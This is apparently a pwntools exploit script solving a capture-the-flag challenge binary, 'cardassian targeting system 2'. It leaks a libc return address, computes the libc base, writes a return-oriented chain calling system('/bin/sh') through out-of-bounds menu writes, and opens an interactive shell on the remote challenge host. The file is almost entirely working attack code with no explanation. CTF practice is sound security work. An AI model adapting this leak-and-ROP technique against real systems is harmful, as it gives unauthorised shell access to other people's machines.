#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chall_patched '--host=spaceheroes-cardassian-targeting-system-2.chals..io' '--port=443'
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chall_patched')
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'spaceheroes-cardassian-targeting-system-2.chals..io'
port = int(args.PORT or 443)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = remote("spaceheroes-cardassian-targeting-system-2.chals.io", 443, ssl=True, sni="spaceheroes-cardassian-targeting-system-2.chals.io")
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x555555400e21
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'.'

"""0x7f4e5f9be6d0                        out    dx, eax
   0x7f4e5f9be6d1                        mov    r13, qword ptr [r13 + 0x28]
   0x7f4e5f9be6d5                        mov    rax, qword ptr [rdi + 0x18]
   0x7f4e5f9be6d9                        cmp    byte ptr [rax], 0x2f
"""

io = start()

io.sendline("edopuzza")
io.sendline(b"4")
io.sendline(b"13")
io.recvuntil(b": ")
ret_addr= io.recvline().strip()
print(hex(int(ret_addr)))
ret_addr = int(ret_addr)
base = ret_addr - libc.sym.__libc_start_main - 243
print("base : " ,hex(base))

pop_rdi = 0x0019a5dd + base

bin_sh = 0x1b75aa + base

system = 0x55410 + base

ret = 0x19c0fa + base

pop_rdi2 = 0x00197089 + base

print(hex(bin_sh), hex(pop_rdi), hex(system))


io.sendline(b"3")
io.sendline(b"0")
io.sendline(str(system).encode())

io.sendline(b"3")
io.sendline(b"-1")
io.sendline(str(ret).encode())

io.sendline(b"3")
io.sendline(b"-2")
io.sendline(str(bin_sh).encode())

io.sendline(b"3")
io.sendline(b"-3")
io.sendline(str(pop_rdi).encode())

io.interactive()